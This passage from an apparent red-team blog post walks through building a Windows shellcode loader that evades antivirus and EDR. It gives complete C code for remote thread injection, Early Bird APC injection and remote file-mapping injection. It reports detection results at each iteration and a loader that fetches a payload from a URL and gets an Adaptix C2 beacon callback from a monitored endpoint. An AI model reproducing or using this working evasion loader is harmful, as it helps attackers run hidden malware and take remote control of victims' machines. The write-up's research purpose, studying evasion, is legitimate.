+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;VirtualAllocEx failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteProcessMemory</span>(hProcess, pExecAddress, pBlob, sBlobSize, <span style="color:#f92672">&amp;</span>sNumberOfBytesWritten)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;WriteProcessMemory failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">VirtualProtectEx</span>(hProcess, pExecAddress, sBlobSize, PAGE_EXECUTE_READ, <span style="color:#f92672">&amp;</span>dwOldProtection)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;VirtualProtectEx failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">RtlSecureZeroMemory</span>(pBlob, sBlobSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">CreateRemoteThread</span>(hProcess, NULL, NULL, pExecAddress, NULL, NULL, NULL) <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;CreateRemoteThread failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Whilte the <code>pBlob</code> and the <code>sBlobSize</code> were the same as those in the <code>Run</code> function, the <code>hProcess</code> was handle to the target process which was derived by enumerating processes on the target system and opening handle to the one specified.</p>
+<ul>
+<li><code>CreateToolhelp32Snapshot</code> was used to create a snapshot of all running processes.</li>
+<li><code>Process32First</code> and <code>Process32Next</code> were used to iterate through the snapshot to find the target process specified in parameter <code>lpszProcessName</code>.</li>
+<li>Finally, a handle to the target process was opened and return through <code>phPRocess</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetRemoteProcessHandle</span>(
+</span></span><span style="display:flex;"><span>	IN	LPWSTR	lpszProcessName,
+</span></span><span style="display:flex;"><span>	OUT	PHANDLE phProcess
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>	BOOL	bSTATE		<span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	HANDLE hSnapshot	<span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	PROCESSENTRY32 Proc <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>		.dwSize <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(PROCESSENTRY32)
+</span></span><span style="display:flex;"><span>	};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	hSnapshot <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, NULL);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hSnapshot <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;CreateToolhelp32Snapshot failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _CleanUp;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">Process32First</span>(hSnapshot, <span style="color:#f92672">&amp;</span>Proc)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Process32First failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _CleanUp;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (Proc.szExeFile) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_wcsicmp</span>(Proc.szExeFile, lpszProcessName) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;[i] Found process </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> with PID: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpszProcessName, Proc.th32ProcessID);
+</span></span><span style="display:flex;"><span>				<span style="color:#f92672">*</span>phProcess <span style="color:#f92672">=</span> <span style="color:#a6e22e">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>phProcess <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>					<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;OpenProcess failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>					bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">goto</span> _CleanUp;
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">while</span> (<span style="color:#a6e22e">Process32Next</span>(hSnapshot, <span style="color:#f92672">&amp;</span>Proc));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_CleanUp:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hSnapshot)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CloseHandle</span>(hSnapshot);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> bSTATE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="testing-time">Testing time</h3>
+<p>Running locally, it is evident from the image below that the loader successfully discovered target process and the execution of <code>calc.exe</code> shows that payload was injected into it and called.</p>
+<p><img src="./NetUtil2-execution.png" alt="NetUtil2-execution"></p>
+<p>Labelling and serving as <em>NetUtil2</em>, I downloaded it onto the monitored enpoint and it was detected just as its predecessor.</p>
+<p><img src="./NetUtil2-exe-detected.png" alt="NetUtil2-exe-detected"></p>
+<p>The VirusTotal detection score decremented by 1, still greater than the original executable let alone anywhere near defense evasion.</p>
+<p><img src="./NetUtil2-virustotal.png" alt="NetUtil2-virustotal"></p>
+<h2 id="early-bird-gets-the-worm">Early bird gets the worm</h2>
+<p>Now, my first target towards reduced detection was to replace execution through newly created thread to some other alternative. Here, I leveraged <strong>Early Bird APC Injection</strong> technique.</p>
+<h3 id="early-bird-apc">Early Bird? APC?</h3>
+<p>APC stands for asynchronous procedure call. As per <a href="https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">Microsoft&rsquo;s documentation</a></p>
+<blockquote>
+<p>An asynchronous procedure call (APC) is a function that executes asynchronously in the context of a particular thread. When an APC is queued to a thread, the system issues a software interrupt. The next time the thread is scheduled, it will run the APC function.</p>
+</blockquote>
+<p>Essentially, through APC injection one can replace the currently executing procedure to another function which may be our shellcode. Thus no new threads are created but the existing one is redirected.</p>
+<p>Early Bird APC injection means that we divert the execution to the target function as soon as a process is launched. This can be achieved through different means, the one demonstrated below spawns a child process but attaches the parent loader process as it&rsquo;s debugger and thus breakpoint is inserted at the <code>main</code> function of the child process. This gives time to push an APC call to replace the <code>main</code> function with shellcode and then the breakpoint is removed to resume execution.</p>
+<p>As the name suggests <code>CreateSuspendedProcess</code> creates a debugged child process in suspended state for the executable specified by <code>lpszProcessName</code> and populates the parameters <code>phProcess</code>, <code>phThread</code> and <code>pdwProcessID</code> with handle to the child process, it&rsquo;s main thread and the process ID respectively.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">CreateSuspendedProcess</span>(
+</span></span><span style="display:flex;"><span>	IN	LPCWSTR	lpszProcessName,
+</span></span><span style="display:flex;"><span>	OUT	PHANDLE	phProcess,
+</span></span><span style="display:flex;"><span>	OUT	PHANDLE	phThread,
+</span></span><span style="display:flex;"><span>	OUT	PDWORD	pdwProcessID
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>	BOOL	bSTATE <span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>	WCHAR	lpszTargetProcessPath[MAX_PATH <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>];
+</span></span><span style="display:flex;"><span>	WCHAR	WnDir[MAX_PATH];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	STARTUPINFO	Si <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>	PROCESS_INFORMATION Pi <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	Si.cb <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(STARTUPINFO);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetEnvironmentVariableW</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;WINDIR&#34;</span>, WnDir, MAX_PATH)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;GetEnvironmentVariableW failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">swprintf_s</span>(lpszTargetProcessPath, MAX_PATH <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">%s&#34;</span>, WnDir, lpszProcessName);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">CreateProcessW</span>(NULL, lpszTargetProcessPath, NULL, NULL, FALSE, DEBUG_PROCESS, NULL, NULL, <span style="color:#f92672">&amp;</span>Si, <span style="color:#f92672">&amp;</span>Pi)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;CreateProcessW failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>phProcess	<span style="color:#f92672">=</span> Pi.hProcess;
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>phThread	<span style="color:#f92672">=</span> Pi.hThread;
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>pdwProcessID <span style="color:#f92672">=</span> Pi.dwProcessId;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// End of Function
+</span></span></span><span style="display:flex;"><span>_EoF:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>phProcess <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> <span style="color:#f92672">*</span>phThread <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> bSTATE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Once the child process is created, to perform APC injection the following code segment is leveraged. While <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code> and <code>VirtualProtectEx</code> are retained to transfer the shellcode to child process&rsquo;s memory, <code>CreateRemoteThread</code> is now replaced by <code>QueueUserAPC</code> thus providing alternative method for execution.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">ScheduleRun</span>(
+</span></span><span style="display:flex;"><span>	IN	HANDLE	hProcess,
+</span></span><span style="display:flex;"><span>	IN	HANDLE	hThread,
+</span></span><span style="display:flex;"><span>	IN	PBYTE	pBlob,
+</span></span><span style="display:flex;"><span>	IN	SIZE_T	sBlobSize
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>	BOOL	bSTATE <span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>	PVOID	pAddress <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	DWORD	dwOldProtection <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	SIZE_T	sNumberOfBytesWritten <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pAddress <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAllocEx</span>(hProcess, NULL, sBlobSize, MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pAddress <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;VirtualAllocEx failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteProcessMemory</span>(hProcess, pAddress, pBlob, sBlobSize, <span style="color:#f92672">&amp;</span>sNumberOfBytesWritten) <span style="color:#f92672">||</span> sNumberOfBytesWritten <span style="color:#f92672">!=</span> sBlobSize) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;WriteProcessMemory failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">VirtualProtectEx</span>(hProcess, pAddress, sBlobSize, PAGE_EXECUTE_READ, <span style="color:#f92672">&amp;</span>dwOldProtection)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;VirtualProtectEx failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">QueueUserAPC</span>((PAPCFUNC)pAddress, hThread, NULL)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;QueueUserAPC failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _EoF;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// End of Function
+</span></span></span><span style="display:flex;"><span>_EoF:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> bSTATE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>While <code>QueueUserAPC</code> queues the instructions to be executed they are executed only when debugger is removed. Thus the follow appears as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">FetchBlob</span>(argv[<span style="color:#ae81ff">1</span>], <span style="color:#f92672">&amp;</span>pBlob, <span style="color:#f92672">&amp;</span>sBlobSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">CreateSuspendedProcess</span>(argv[<span style="color:#ae81ff">2</span>], <span style="color:#f92672">&amp;</span>hProcess, <span style="color:#f92672">&amp;</span>hThread, <span style="color:#f92672">&amp;</span>dwProcessID);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ScheduleRun</span>(hProcess, hThread, pBlob, sBlobSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">DebugActiveProcessStop</span>(dwProcessID);
+</span></span></code></pre></div><h3 id="ah-shit-here-we-go-again">Ah shit, here we go again</h3>
+<p>Labelling this version as <em>NetUtil3</em> and downloading it on monitored endpoint got me nowhere but back to detection.</p>
+<p><img src="./NetUtil3-detection.png" alt="NetUtil3-detection"></p>
+<p>But uploading it to VirusTotal showed that the detection score dropped to 13, still one greater than the Adaptix&rsquo;s binary but a siginficant improvemnt in the loader logic nonetheless.</p>
+<p><img src="./NetUtil3-virustotal.png" alt="NetUtil3-virustotal"></p>
+<h2 id="cartography">Cartography</h2>
+<p><code>VirtualAlloc(Ex)</code>, <code>VirtualProtect(Ex)</code> and <code>WriteProcessMemory</code> are highly flagged as an indicator for malicious code and thus I needed alternative for the same. A differnt technique to transfer shellcode is through <strong>Remote File Mapping</strong> injection.</p>
+<h3 id="remote-file-mappings-and-injection">Remote File Mappings and Injection</h3>
+<p>Remote File Mappings allow to create shared memory regions accessible between different processes. This eliminates the need of <code>VirtualAllocEx</code> to allocate memory in target process. The injection logic can be interepreted as:</p>
+<ul>
+<li><code>CreateFileMapping</code> allows to create a mapping object i.e. allocate virtual memory backed by a pagefile. As there is no need to load a file, thus I specify <code>INVALID_HANDLE_VALUE</code> for <code>hFile</code> parameter. While I need to provide specify <code>PAGE_EXECUTE_READWRITE</code> for <code>flProtect</code> parameter it dictates this section objects maximum allowable permissions. The map views of the memory page would writable or executable, <em>but separately</em> in the two processes. Thus is does not appear to be a grave issue.</li>
+<li><code>MapViewOfFile</code> was used to create a local view of the mapping object and obtain local address for the memory with write access as specified by <code>FILE_MAP_WRITE</code>. Using this address, I wrote the shellcode into the memory.</li>
+<li><code>MapViewOfFile2</code> was used to obtain remote address in target process&rsquo;s view of the mapping object. This memory was designated to be executable and thus byte written by local process could be executed by remote process.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">CopyBlob</span>(
+</span></span><span style="display:flex;"><span>	IN	HANDLE	hProcess,
+</span></span><span style="display:flex;"><span>	IN	PBYTE	pBlob,
+</span></span><span style="display:flex;"><span>	IN	SIZE_T	sBlobSize,
+</span></span><span style="display:flex;"><span>	OUT	PVOID<span style="color:#f92672">*</span> ppBlobCopyAddress
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>	BOOL	bSTATE	<span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>	HANDLE	hFile	<span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	PVOID	pMapLocalAddress <span style="color:#f92672">=</span> NULL,
+</span></span><span style="display:flex;"><span>			pMapRemoteAddress <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	hFile <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileMapping</span>(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sBlobSize, NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hFile <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;CreateFileMapping failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _EndOfFunction;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pMapLocalAddress <span style="color:#f92672">=</span> <span style="color:#a6e22e">MapViewOfFile</span>(hFile, FILE_MAP_WRITE, NULL, NULL, sBlobSize);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pMapLocalAddress <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;MapViewOfFile failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _EndOfFunction;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memcpy</span>(pMapLocalAddress, pBlob, sBlobSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pMapRemoteAddress <span style="color:#f92672">=</span> <span style="color:#a6e22e">MapViewOfFile2</span>(hFile, hProcess, NULL, NULL, NULL, NULL, PAGE_EXECUTE_READ);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pMapRemoteAddress <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;MapViewOfFile2 failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _EndOfFunction;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>ppBlobCopyAddress <span style="color:#f92672">=</span> pMapRemoteAddress;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_EndOfFunction:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hFile)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CloseHandle</span>(hFile);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> bSTATE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The parameter <code>ppBlobCopyAddress</code> contains the executable memory&rsquo;s address in the context of the remote process. I pushed this address through Early Bird APC Injection technique discussed earlier into child process for execution.</p>
+<h3 id="success-sort-of">Success? Sort of.</h3>
+<p>I renamed this version as <em>NetUtil4.exe</em> and downloaded on monitored endpoint. <strong>It wasn&rsquo;t detected</strong>.</p>
+<p><img src="./NetUtil4-download-1.png" alt="NetUtil4-download-1"></p>
+<p>But I could not run it because being the idiot that I am, I shipped the debug build and executing <em>NetUtil4.exe</em> complained for missing <code>VCRUNTIME140D.dll</code>. Recompiling the release build with <em>Multi-Threaded</em> configuration instead of DLL depedent <em>Multi-Threaded DLL</em> Runtime Library flag and downloading it on monitored endpoint led to a detection.</p>
+<p><img src="./VS-runtime-options.png" alt="VS-runtime-options"></p>
+<p><img src="./NetUtil4-release-detection.png" alt="NetUtil4-release-detection"></p>
+<p>At this moment, I said to myself - <em>One problem at a time</em> and installed the Microsoft Visual C++ Runtime library onto the endpoint (<em>with a promise to explore the alternatives later</em>).</p>
+<p>Re-downloading the <em>Mulit-Threaded DLL</em> build lead to no detection.</p>
+<p><img src="./NetUtil4-download-2.png" alt="NetUtil4-download-2"></p>
+<p>I executed the loader with URL to payload and a process to spawn and hijack for execution on the monitored endpoint and it spawned <code>calc.exe</code>.</p>
+<p><img src="./NetUtil4-spawns-calc.png" alt="NetUtil4-spawns-calc"></p>
+<p>Next, I replaced the <code>blob.bin</code> from <code>msfvenom</code> payload to beacon shellcode for Adaptix.</p>
+<p><img src="./adaptix-c2-create-agent-and-listener.png" alt="adaptix-c2-create-agent-and-listener"></p>
+<p>Passing the loader with URL to beacon shellcode I recieved a callback onto the C2 server from the monitored endpoint. I had to add parameter as <code>InternetOpenUrlW</code> cached the URL for <code>blob.bin</code> with <code>msfvenom</code> calc.exe payload, I re-configured that later as explained in following section.</p>
+<p><img src="./NetUtil4-adaptix-beacon-execute.png" alt="NetUtil4-adaptix-beacon-execute"></p>
+<p><img src="./adaptix-c2-beacon-callback.png" alt="adaptix-c2-beacon-callback"></p>
+<p>The VirusTotal score for this version of loader was 6 i.e. half of the original Adaptix C2 beacon executable and almost 1/4th of the original rudimetory loader.</p>
+<p>Furthermore, as per VirusTotal Elastic did detect the loader.</p>
